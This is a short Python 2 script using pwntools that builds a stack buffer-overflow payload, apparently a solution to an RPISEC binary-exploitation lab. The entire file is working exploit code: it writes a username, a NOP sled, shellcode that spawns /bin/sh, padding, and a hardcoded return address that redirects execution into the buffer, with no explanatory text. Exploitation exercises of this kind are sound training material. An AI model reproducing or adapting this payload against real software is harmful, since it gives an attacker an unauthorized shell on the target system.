#!/usr/bin/python2.7
from pwn import *
context(arch = 'i386', os = 'linux')

shellcode = ""
USERNAME = "rpisec\n"
BIN_SH = asm(shellcraft.sh())
BUF_ADDR = "\x5C\xF5\xFF\xBF"

shellcode += USERNAME
shellcode += "\x90" * 4
shellcode += BIN_SH
shellcode += "A" * (80 - len(shellcode) + len(USERNAME))
shellcode += BUF_ADDR

print shellcode
